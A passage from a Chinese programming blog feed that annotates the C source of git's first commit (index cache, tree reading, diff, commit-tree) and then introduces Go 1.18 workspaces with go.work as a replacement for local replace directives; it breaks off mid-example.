&#123;</span><br><span class="line">    <span class="keyword">if</span> (errno != EEXIST) &#123;</span><br><span class="line">      perror(path);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cache结构体用来存储时间、SHA、大小等信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cache_entry</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cache_time</span> <span class="title">ctime</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cache_time</span> <span class="title">mtime</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> st_dev;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> st_ino;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> st_mode;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> st_uid;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> st_gid;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> st_size;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> sha1[<span class="number">20</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> namelen;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>update-cache.c</code>实现了文件缓冲区的功能，类似<code>git stage</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">add_cache_entry</span><span class="params">(<span class="keyword">struct</span> cache_entry *ce)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> pos;</span><br><span class="line">    <span class="comment">// 获取pos</span></span><br><span class="line">  pos = cache_name_pos(ce-&gt;name, ce-&gt;namelen);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* existing match? Just replace it */</span></span><br><span class="line">  <span class="keyword">if</span> (pos &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    active_cache[-pos<span class="number">-1</span>] = ce;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure the array is big enough .. */</span></span><br><span class="line">  <span class="keyword">if</span> (active_nr == active_alloc) &#123;</span><br><span class="line">    active_alloc = alloc_nr(active_alloc);</span><br><span class="line">    active_cache = <span class="built_in">realloc</span>(active_cache, active_alloc * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cache_entry *));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Add it in.. */</span></span><br><span class="line">  active_nr++;</span><br><span class="line">  <span class="keyword">if</span> (active_nr &gt; pos)</span><br><span class="line">    memmove(active_cache + pos + <span class="number">1</span>, active_cache + pos, (active_nr - pos - <span class="number">1</span>) * <span class="keyword">sizeof</span>(ce));</span><br><span class="line">  active_cache[pos] = ce;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加到缓冲区（类似stage changes）</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">add_file_to_cache</span><span class="params">(<span class="type">char</span> *path)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> size, namelen;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cache_entry</span> *<span class="title">ce</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">  fd = open(path, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (errno == ENOENT)</span><br><span class="line">      <span class="keyword">return</span> remove_file_from_cache(path);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (fstat(fd, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  namelen = <span class="built_in">strlen</span>(path);</span><br><span class="line">  size = cache_entry_size(namelen);</span><br><span class="line">  ce = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memset</span>(ce, <span class="number">0</span>, size);</span><br><span class="line">  <span class="built_in">memcpy</span>(ce-&gt;name, path, namelen);</span><br><span class="line">  ce-&gt;ctime.sec = st.st_ctime;</span><br><span class="line">  ce-&gt;ctime.nsec = st.st_ctim.tv_nsec;</span><br><span class="line">  ce-&gt;mtime.sec = st.st_mtime;</span><br><span class="line">  ce-&gt;mtime.nsec = st.st_mtim.tv_nsec;</span><br><span class="line">  ce-&gt;st_dev = st.st_dev;</span><br><span class="line">  ce-&gt;st_ino = st.st_ino;</span><br><span class="line">  ce-&gt;st_mode = st.st_mode;</span><br><span class="line">  ce-&gt;st_uid = st.st_uid;</span><br><span class="line">  ce-&gt;st_gid = st.st_gid;</span><br><span class="line">  ce-&gt;st_size = st.st_size;</span><br><span class="line">  ce-&gt;namelen = namelen;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (index_fd(path, namelen, ce, fd, &amp;st) &lt; <span class="number">0</span>)   <span class="comment">// 索引</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> add_cache_entry(ce);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rm功能：（类似于 git rm –cached，移出缓冲区）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">remove_file_from_cache</span><span class="params">(<span class="type">char</span> *path)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> pos = cache_name_pos(path, <span class="built_in">strlen</span>(path));</span><br><span class="line">  <span class="keyword">if</span> (pos &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    pos = -pos<span class="number">-1</span>;</span><br><span class="line">    active_nr--;</span><br><span class="line">    <span class="keyword">if</span> (pos &lt; active_nr)</span><br><span class="line">      memmove(active_cache + pos, active_cache + pos + <span class="number">1</span>, (active_nr - pos - <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cache_entry *));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写入cache：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_cache</span><span class="params">(<span class="type">int</span> newfd, <span class="keyword">struct</span> cache_entry **cache, <span class="type">int</span> entries)</span></span><br><span class="line">&#123;</span><br><span class="line">  SHA_CTX c;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">cache_header</span> <span class="title">hdr</span>;</span></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  hdr.signature = CACHE_SIGNATURE;</span><br><span class="line">  hdr.version = <span class="number">1</span>;</span><br><span class="line">  hdr.entries = entries;</span><br><span class="line"></span><br><span class="line">  SHA1_Init(&amp;c);</span><br><span class="line">  SHA1_Update(&amp;c, &amp;hdr, offsetof(<span class="keyword">struct</span> cache_header, sha1));</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; entries; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cache_entry</span> *<span class="title">ce</span> =</span> cache[i];</span><br><span class="line">    <span class="type">int</span> size = ce_size(ce);</span><br><span class="line">    SHA1_Update(&amp;c, ce, size);</span><br><span class="line">  &#125;</span><br><span class="line">  SHA1_Final(hdr.sha1, &amp;c);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write(newfd, &amp;hdr, <span class="keyword">sizeof</span>(hdr)) != <span class="keyword">sizeof</span>(hdr))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; entries; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cache_entry</span> *<span class="title">ce</span> =</span> cache[i];</span><br><span class="line">    <span class="type">int</span> size = ce_size(ce);</span><br><span class="line">    <span class="keyword">if</span> (write(newfd, ce, size) != size)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>

<p><code>read-tree.c</code>比较简单，读取tree的sha1和path等信息并打出来</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输入SHA1值，读取并打印</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">unpack</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *sha1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buffer;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">  <span class="type">char</span> type[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">  buffer = read_sha1_file(sha1, type, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> (!buffer)</span><br><span class="line">    usage(<span class="string">&quot;unable to read sha1 file&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(type, <span class="string">&quot;tree&quot;</span>))</span><br><span class="line">    usage(<span class="string">&quot;expected a &#x27;tree&#x27; node&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (size) &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(buffer)+<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *sha1 = buffer + len;</span><br><span class="line">    <span class="type">char</span> *path = <span class="built_in">strchr</span>(buffer, <span class="string">&#x27; &#x27;</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; len + <span class="number">20</span> || <span class="built_in">sscanf</span>(buffer, <span class="string">&quot;%o&quot;</span>, &amp;mode) != <span class="number">1</span>)</span><br><span class="line">      usage(<span class="string">&quot;corrupt &#x27;tree&#x27; file&quot;</span>);</span><br><span class="line">    buffer = sha1 + <span class="number">20</span>;</span><br><span class="line">    size -= len + <span class="number">20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%o %s (%s)\n&quot;</span>, mode, path, sha1_to_hex(sha1));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>show-diff.c</code>用来比较文件差异, <code>match_stat</code>判断是否一致</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断两个文件的cache_entry中的名称、uid、大小等信息是否一致，用以判断是否更改</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">match_stat</span><span class="params">(<span class="keyword">struct</span> cache_entry *ce, <span class="keyword">struct</span> stat *st)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ce-&gt;mtime.sec != (<span class="type">unsigned</span> <span class="type">int</span>) st-&gt;st_mtim.tv_sec</span><br><span class="line">        || ce-&gt;mtime.nsec != (<span class="type">unsigned</span> <span class="type">int</span>) st-&gt;st_mtim.tv_nsec)</span><br><span class="line">        changed |= MTIME_CHANGED;</span><br><span class="line">    <span class="keyword">if</span> (ce-&gt;ctime.sec != (<span class="type">unsigned</span> <span class="type">int</span>) st-&gt;st_ctim.tv_sec</span><br><span class="line">        || ce-&gt;ctime.nsec != (<span class="type">unsigned</span> <span class="type">int</span>) st-&gt;st_ctim.tv_nsec)</span><br><span class="line">        changed |= CTIME_CHANGED;</span><br><span class="line">    <span class="keyword">if</span> (ce-&gt;st_uid != (<span class="type">unsigned</span> <span class="type">int</span>) st-&gt;st_uid || ce-&gt;st_gid != (<span class="type">unsigned</span> <span class="type">int</span>) st-&gt;st_gid)</span><br><span class="line">        changed |= OWNER_CHANGED;</span><br><span class="line">    <span class="keyword">if</span> (ce-&gt;st_mode != (<span class="type">unsigned</span> <span class="type">int</span>) st-&gt;st_mode)</span><br><span class="line">        changed |= MODE_CHANGED;</span><br><span class="line">    <span class="keyword">if</span> (ce-&gt;st_dev != (<span class="type">unsigned</span> <span class="type">int</span>) st-&gt;st_dev || ce-&gt;st_ino != (<span class="type">unsigned</span> <span class="type">int</span>) st-&gt;st_ino)</span><br><span class="line">        changed |= INODE_CHANGED;</span><br><span class="line">    <span class="keyword">if</span> (ce-&gt;st_size != (<span class="type">unsigned</span> <span class="type">int</span>) st-&gt;st_size)</span><br><span class="line">        changed |= DATA_CHANGED;</span><br><span class="line">    <span class="keyword">return</span> changed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>show_differences</code>用于显示差异</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">show_differences</span><span class="params">(<span class="keyword">struct</span> cache_entry *ce,</span></span><br><span class="line"><span class="params">                             <span class="keyword">struct</span> stat *cur,</span></span><br><span class="line"><span class="params">                             <span class="type">void</span> *old_contents,</span></span><br><span class="line"><span class="params">                             <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> old_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> cmd[<span class="number">1000</span>];</span><br><span class="line">    FILE *f;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(cmd, <span class="keyword">sizeof</span>(cmd), <span class="string">&quot;diff -u - %s&quot;</span>, ce-&gt;name);</span><br><span class="line">    f = popen(cmd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(old_contents, old_size, <span class="number">1</span>, f);</span><br><span class="line">    pclose(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>commit-tree.c</code>用于commit提交：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXPARENT (16)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, len;</span><br><span class="line">    <span class="type">int</span> parents = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tree_sha1[<span class="number">20</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> parent_sha1[MAXPARENT][<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> *gecos, *realgecos;</span><br><span class="line">    <span class="type">char</span> *email, realemail[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">char</span> *date, *realdate;</span><br><span class="line">    <span class="type">char</span> comment[<span class="number">1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span>;</span></span><br><span class="line">    <span class="type">time_t</span> now;</span><br><span class="line">    <span class="type">char</span> *buffer;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span> || get_sha1_hex(argv[<span class="number">1</span>], tree_sha1) &lt; <span class="number">0</span>)</span><br><span class="line">        usage(<span class="string">&quot;commit-tree &lt;sha1&gt; [-p &lt;sha1&gt;]* &lt; changelog&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt; argc; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">char</span> *a, *b;</span><br><span class="line">        a = argv[i];</span><br><span class="line">        b = argv[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (!b || <span class="built_in">strcmp</span>(a, <span class="string">&quot;-p&quot;</span>) || get_sha1_hex(b, parent_sha1[parents]))</span><br><span class="line">            usage(<span class="string">&quot;commit-tree &lt;sha1&gt; [-p &lt;sha1&gt;]* &lt; changelog&quot;</span>);</span><br><span class="line">        parents++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!parents)</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Committing initial tree %s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    pw = getpwuid(getuid());</span><br><span class="line">    <span class="keyword">if</span> (!pw)</span><br><span class="line">        usage(<span class="string">&quot;You don&#x27;t exist. Go away!&quot;</span>);</span><br><span class="line">    realgecos = pw-&gt;pw_gecos;</span><br><span class="line">    len = <span class="built_in">strlen</span>(pw-&gt;pw_name);</span><br><span class="line">    <span class="built_in">memcpy</span>(realemail, pw-&gt;pw_name, len);</span><br><span class="line">    realemail[len] = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">    gethostname(realemail + len + <span class="number">1</span>, <span class="keyword">sizeof</span>(realemail) - len - <span class="number">1</span>);</span><br><span class="line">    time(&amp;now);</span><br><span class="line">    realdate = ctime(&amp;now);</span><br><span class="line"></span><br><span class="line">    gecos = getenv(<span class="string">&quot;COMMITTER_NAME&quot;</span>) ?: realgecos;</span><br><span class="line">    email = getenv(<span class="string">&quot;COMMITTER_EMAIL&quot;</span>) ?: realemail;</span><br><span class="line">    date = getenv(<span class="string">&quot;COMMITTER_DATE&quot;</span>) ?: realdate;</span><br><span class="line"></span><br><span class="line">    remove_special(gecos);</span><br><span class="line">    remove_special(realgecos);</span><br><span class="line">    remove_special(email);</span><br><span class="line">    remove_special(realemail);</span><br><span class="line">    remove_special(date);</span><br><span class="line">    remove_special(realdate);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加buffer，准备写入</span></span><br><span class="line">    init_buffer(&amp;buffer, &amp;size);</span><br><span class="line">    add_buffer(&amp;buffer, &amp;size, <span class="string">&quot;tree %s\n&quot;</span>, sha1_to_hex(tree_sha1));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * NOTE! This ordering means that the same exact tree merged with a</span></span><br><span class="line"><span class="comment">   * different order of parents will be a _different_ changeset even</span></span><br><span class="line"><span class="comment">   * if everything else stays the same.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; parents; i++)</span><br><span class="line">        add_buffer(&amp;buffer, &amp;size, <span class="string">&quot;parent %s\n&quot;</span>, sha1_to_hex(parent_sha1[i]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Person/date information */</span></span><br><span class="line">    add_buffer(&amp;buffer, &amp;size, <span class="string">&quot;author %s &lt;%s&gt; %s\n&quot;</span>, gecos, email, date);</span><br><span class="line">    add_buffer(&amp;buffer, &amp;size, <span class="string">&quot;committer %s &lt;%s&gt; %s\n\n&quot;</span>, realgecos, realemail, realdate);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* And add the comment */</span></span><br><span class="line">    <span class="keyword">while</span> (fgets(comment, <span class="keyword">sizeof</span>(comment), <span class="built_in">stdin</span>) != <span class="literal">NULL</span>)</span><br><span class="line">        add_buffer(&amp;buffer, &amp;size, <span class="string">&quot;%s&quot;</span>, comment);</span><br><span class="line"></span><br><span class="line">    finish_buffer(<span class="string">&quot;commit &quot;</span>, &amp;buffer, &amp;size);       <span class="comment">// 写入buffer</span></span><br><span class="line"></span><br><span class="line">    write_sha1_file(buffer, size);  <span class="comment">// 写入sha1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>remove_special的实现也比较简单，一个简单的遍历：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">remove_special</span><span class="params">(<span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="type">char</span> *dst = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        c = *p;</span><br><span class="line">        p++;</span><br><span class="line">        <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *dst++ = c;</span><br><span class="line">        <span class="keyword">if</span> (!c)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译通过之后可以用一下试试:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x *.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">./init-db</span><br><span class="line"><span class="comment"># 随便添加点内容</span></span><br><span class="line"><span class="built_in">echo</span> $(<span class="built_in">date</span> +%c) &gt;&gt; test.txt</span><br><span class="line"><span class="comment"># 写入到缓冲区</span></span><br><span class="line">./update-cache test.txt</span><br><span class="line"><span class="comment"># 然后在 .dircache/objects 下面会看到相关内容</span></span><br><span class="line">tree -L .dircache/objects</span><br><span class="line"></span><br><span class="line"><span class="comment"># objects下面的内容可以用catfile查看</span></span><br><span class="line">./cat-file </span><br><span class="line"></span><br><span class="line"><span class="comment"># 将缓冲区object写入</span></span><br><span class="line">./write-tree</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看写入内容</span></span><br><span class="line">./read-tree </span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交更改</span></span><br><span class="line"><span class="comment"># 填写commit信息</span></span><br><span class="line">./commit-tree </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看提交内容</span></span><br><span class="line">./cat-file </span><br><span class="line"></span><br><span class="line"><span class="comment"># echo </span></span><br></pre></td></tr></table></figure>

<p>我们看初版的源码可以发现，git确实是一个保存snapshot而不是保存diff的工具。后面版本我们可以看到git对存储冗余的优化。</p>
<h2 id="link"><a href="#link" class="headerlink" title="link"></a>link</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpdC9naXQ=">git<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29r">Pro Git<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuYmxvZy8yMDIwLTEyLTE3LWNvbW1pdHMtYXJlLXNuYXBzaG90cy1ub3QtZGlmZnMv">Commits are snapshots, not diffs<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuYmxvZy8yMDIyLTA4LTI5LWdpdHMtZGF0YWJhc2UtaW50ZXJuYWxzLWktcGFja2VkLW9iamVjdC1zdG9yZS8=">Git’s database internals I: packed object store<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9iaXRidWNrZXQub3JnL2Jsb2cvd2hhdC1jYW4td2UtbGVhcm4tZnJvbS10aGUtY29kZS1pbi1naXRzLWluaXRpYWwtY29tbWl0">What Can We Learn from the Code in Git’s Initial Commit?<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Go Workspace：本地可以愉快的replace了</title>
    <url>/go-multi-module-workspace/</url>
    <content><![CDATA[<p>昨天go2:1.18终于发布了，万众期待的泛型终于来了。不过我一直期待的是 go mod 的改动，新增了workspace和go vendor那几个命令不再默认更新<code>go.mod</code>和<code>go.sum</code>，不用再苦哈哈的replace和固定版本了。<br><del>然而这并不能改变go包管理器依旧鸡肋的现状</del></p>
<span id="more"></span>

<h2 id="终于等到workspace"><a href="#终于等到workspace" class="headerlink" title="终于等到workspace"></a>终于等到workspace</h2><p>之前用 go module 我们有各种奇奇怪怪的理由要用replace：</p>
<ol>
<li>我在本地新建了一个项目，然后我<code>go mod init github/archaeoraptor/XXX</code>， 但是我暂时不想push上去</li>
<li>写的比较乱我暂时不想commit</li>
<li>用到了别人的依赖但是我魔改了点内容</li>
<li>哎哎哎，go mod tidy 怎么自动把我modules版本升上去了，我不想升啊</li>
<li>我想把github上面的私有项目迁移到gitea，想把url换成这个</li>
</ol>
<p>我自己写就在<code>go.mod</code>里面replace就好了，手写几行 replace 又不是太麻烦的事情。<br>然而我和我室友一起写点项目的时候麻烦就来了，replace 的本地路径不一样，我是<code>/home/xxx/xxx</code>，他是<code>C:\XXX\XXX</code>，这样在 commit 的时候就有问题。但是把<code>go.mod</code>放到<code>.gitignore</code>里面忽略掉又不好。</p>
<p>如果有一个像vscode那样的workspace，workspace中的本地json设置可以覆盖全局的json设置就好了。</p>
<h2 id="go-work-使用"><a href="#go-work-使用" class="headerlink" title="go work 使用"></a>go work 使用</h2><p>举例说明一下, 新建一个叫hello的repo, hello.go和main.go内容:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hello.go</span></span><br><span class="line"><span class="keyword">package</span> hello</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/archaeoraptor/hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    hello.Hello()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果你想不commit和push, 也不想修改go.mod文件加入replace，在本地能跑，那么需要将这两个文件放到同一个 go module 里面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go mod init github.com/archaeoraptor/hello_repo</span><br><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── go.mod</span><br><span class="line">├── hello</span><br><span class="line">│   ├── go.mod</span><br><span class="line">│   └── hello.go</span><br><span class="line">└── main.go</span><br></pre></td></tr></table></figure>

<p>repo根目录的<code>go.mod</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module github.com/archaeoraptor/hello_repo</span><br><span class="line"></span><br><span class="line">go 1.18</span><br></pre></td></tr></table></figure>

<p>这个时候不commit并push到远程，直接执行<code>go run main.go</code>是可以正常运行出<code>Hello, World!</code>的。</p>
<p>不过有的时候我们想要设置嵌套模块(nested modules)或者一个repo里面多个module（<strong>比如万恶的grpc，一个项目里面可能要依赖不同版本的grpc</strong>, 这时候就需要一个项目中多个<code>go.mod</code>来兼容不同的版本）</p>
<p>如果你想给hello单独设为嵌套模块<br>目录结构变成这样:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">module github.com/archaeoraptor/hello</span><br><span class="line"></span><br><span class="line">go 1.18</span><br></pre></td></tr></table></figure>

<p>此时：hello目录的<code>go.mod</code>长这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module github.com/archaeoraptor/hello/hello</span><br><span class="line"></span><br><span class="line">go 1.18</span><br></pre></td></tr></table></figure>

<p>此时我们还没有上传，就会报错<code>go: finding module for package github.com/archaeoraptor/hello/hello  ... fatal: repository &#39;https://github.com/archaeoraptor/hello/&#39; not found</code>或者<code>can&#39;t request version &quot;latest&quot; of the main module (github.com/archaeoraptor/hello)</code></p>
<p>这个时候我们以前会改<code>go.mod</code>用replace替换成本地的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module github.com/archaeoraptor/hello</span><br><span class="line"></span><br><span class="line">go 1.18</span><br><span class="line"></span><br><span class="line">require github.com/archaeoraptor/hello/hello v0.0.0-20220318143722-96fbd621879d</span><br><span class="line"></span><br><span class="line">replace github.com/archaeoraptor/hello/hello =&gt; ../hello/hello</span><br></pre></td></tr></table></figure>

<p>有了workspace，可以将replace写在<code>go.work</code>中，然后将<code>go.work</code>添加到<code>.gitignore</code>。这样不同人对replace的更改就不会影响repo中的<code>go.mod</code>了</p>
<p>新建workspace(在module的外层目录)</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">cd ..</span><br><span class="line"><span class="keyword">go</span> work init ./hello</span><br></pre></td></tr></table></figure>

